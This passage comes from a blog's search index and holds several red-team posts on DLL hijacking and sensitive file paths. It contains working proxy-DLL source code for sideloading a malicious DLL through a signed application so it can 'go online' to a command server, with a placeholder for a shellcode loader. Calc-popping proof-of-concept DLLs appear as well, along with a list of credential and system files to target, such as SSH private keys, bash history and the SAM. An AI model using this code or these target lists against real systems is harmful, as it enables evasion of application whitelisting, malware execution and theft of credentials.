class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210722160656515.png" alt="image"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">The popover code is as follows:#include &quot;pch.h&quot;#includeBOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:MessageBox(NULL, &quot;yyy&quot;, &quot;y&quot;, MB_OK);WinExec(&quot;calc.exe&quot;, SW_HIDE);case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;Running the program directly will not trigger the popover<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145554786.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Confirm that the popover can be triggered after the normal call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145658925.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145709773.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Must conform to the relevant grammatical structure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Note that you need to distinguish between 64 and 32 bits!!In the same way, you can run the program here and you can go online，The basic operations are omitted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sensitive path information concerns</title>
      <link href="2021/07/21/sensitive-path-information-concerns/"/>
      <url>2021/07/21/sensitive-path-information-concerns/</url>
      
        <content type="html"><![CDATA[<h6 id="If-there-is-insufficient-the-follow-up-to-continue"><a href="#If-there-is-insufficient-the-follow-up-to-continue" class="headerlink" title="If there is insufficient, the follow-up to continue"></a>If there is insufficient, the follow-up to continue</h6><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="apache-amp-apache2"><a href="#apache-amp-apache2" class="headerlink" title="apache&amp;apache2"></a>apache&amp;apache2</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf&#x2F;home&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf  web file&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F; config file&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F; all config file&#x2F;etc&#x2F;apache2&#x2F;apache2.conf Apache config file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;mounts File system list&#x2F;proc&#x2F;cpuinfo CPU&#x2F;proc&#x2F;meminfo memory&#x2F;proc&#x2F;self -&gt; pid information&#x2F;proc&#x2F;self&#x2F;environ environment variable&#x2F;proc&#x2F;[pid]&#x2F;cmdline Process start parameter  such as &#x2F;proc&#x2F;1&#x2F;cmdline&#x2F;proc&#x2F;[pid]&#x2F;mountinfo Information about the file system mount&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[fd] The file that the process opened&#x2F;proc&#x2F;[pid]&#x2F;exe An exe file that points to the process&#x2F;proc&#x2F;config.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;hosts.deny &#x2F;etc&#x2F;bashrc &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue&#x2F;net &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;termcap &#x2F;etc&#x2F;xinetd.d&#x2F;etc&#x2F;mtab &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf&#x2F;etc&#x2F;xinetd.conf &#x2F;etc&#x2F;protocols &#x2F;etc&#x2F;logrotate.conf &#x2F;etc&#x2F;ld.so.conf &#x2F;etc&#x2F;resolv.conf &#x2F;etc&#x2F;sysconfig&#x2F;network&#x2F;etc&#x2F;sendmail.cf&#x2F;etc&#x2F;sendmail.cw <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Root-permission-required"><a href="#Root-permission-required" class="headerlink" title="Root permission required"></a>Root permission required</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub&#x2F;root&#x2F;.ssh&#x2F;known_hosts&#x2F;root&#x2F;.bash_history&#x2F;root&#x2F;.mysql_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><pre class="line-numbers language-none"><code class="language-none">c:\boot.inic:\windows\systems32\inetsrv\MetaBase.xmlc:\windows\repair\samC:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Essays record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking the whitelist application online</title>
      <link href="2021/07/20/dll-hijacking-the-whitelist-application-online/"/>
      <url>2021/07/20/dll-hijacking-the-whitelist-application-online/</url>
      
        <content type="html"><![CDATA[<h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DDOS(LPVOID lpParameter)&#123;your shellcode loader&#125;staticHMODULE g_OldModule &#x3D; NULL;VOID WINAPI Free()&#123;if (g_OldModule)&#123;FreeLibrary(g_OldModule);&#125;&#125;BOOL WINAPI Load()&#123;TCHAR tzPath[MAX_PATH];TCHAR tzTemp[MAX_PATH * 2];&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); &#x2F;&#x2F;PathRemoveFileSpec(tzPath);GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));g_OldModule &#x3D; LoadLibrary(tzPath);if (g_OldModule &#x3D;&#x3D; NULL)&#123;wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);&#125;return (g_OldModule !&#x3D; NULL);&#125;FARPROC WINAPI GetAddress(PCSTR pszProcName)&#123;FARPROC fpAddress;CHAR szProcName[64];TCHAR tzTemp[MAX_PATH];fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);if (fpAddress &#x3D;&#x3D; NULL)&#123;if (HIWORD(pszProcName) &#x3D;&#x3D; 0)&#123;wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);pszProcName &#x3D; szProcName;&#125;wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);ExitProcess(-2);&#125;return fpAddress;&#125;BOOL WINAPI Init()&#123;pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);return TRUE;&#125;DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)&#123;HANDLE hProcess;PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());if (hProcess)&#123;WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);CloseHandle(hProcess);&#125;return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123;HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)&#123;DisableThreadLibraryCalls(hModule);if (Load() &amp;&amp; Init())&#123;TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);TCHAR szCurName[MAX_PATH];GetModuleFileName(NULL, szCurName, MAX_PATH);PathStripPath(szCurName);if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)&#123;HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);if (hThread)&#123;CloseHandle(hThread);&#125;&#125;&#125;&#125;else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)&#123;Free();&#125;return TRUE;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)&#123;__asm jmp pfnAheadLib_GetVgaAllInfo;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)&#123;__asm jmp pfnAheadLib_GetVgaTemp;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking from hijacking to on-line</title>
      <link href="2021/07/19/dll-hijacking-from-hijacking-to-on-line/"/>
      <url>2021/07/19/dll-hijacking-from-hijacking-to-on-line/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">用中文写下理论知识，避免翻译的会看不懂了DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL程序所在目录加载 DLL 时所在的当前目录系统目录即SYSTEM32目录16位系统目录即SYSTEM目录Windows目录PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-Study"><a href="#Easy-Study" class="headerlink" title="Easy Study"></a>Easy Study</h2><pre class="line-numbers language-none"><code class="language-none">A lot of basic grammar is required here, so I won&#39;t go into detail hereHere use forward to implementationProgram A calls the function in AAA.dll, now change the AAA.dll to AAA_o.dll, then write A new AAA.dll and forward the original function to AAA_o.dllThe DLL is as follows. You need to write an EXE to call the DLL and its functionsaaa.dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); &#125;the successful call has the following effect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" alt="1"></p><pre class="line-numbers language-none"><code class="language-none">Take a look at the export function and confirm the test export function<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/2.png" alt="2"></p><pre class="line-numbers language-none"><code class="language-none">new dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:WinExec(&quot;calc.exe&quot;, SW_HIDE); case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);if (hDllInst) &#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc) &#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;The effect after hijacking is as followsA different way to use precompilation is much faster#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/3.png" alt="3"></p><h2 id="How-to-Online"><a href="#How-to-Online" class="headerlink" title="How to Online"></a>How to Online</h2><pre class="line-numbers language-none"><code class="language-none">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DoSC(LPVOID lpParameter)&#123;Like you SC loader&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);break;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/4.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近太忙了，等过两天有空了开始更新！</title>
      <link href="2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/"/>
      <url>2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="博客暂未完全调试好，敬请期待"><a href="#博客暂未完全调试好，敬请期待" class="headerlink" title="博客暂未完全调试好，敬请期待"></a>博客暂未完全调试好，敬请期待</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
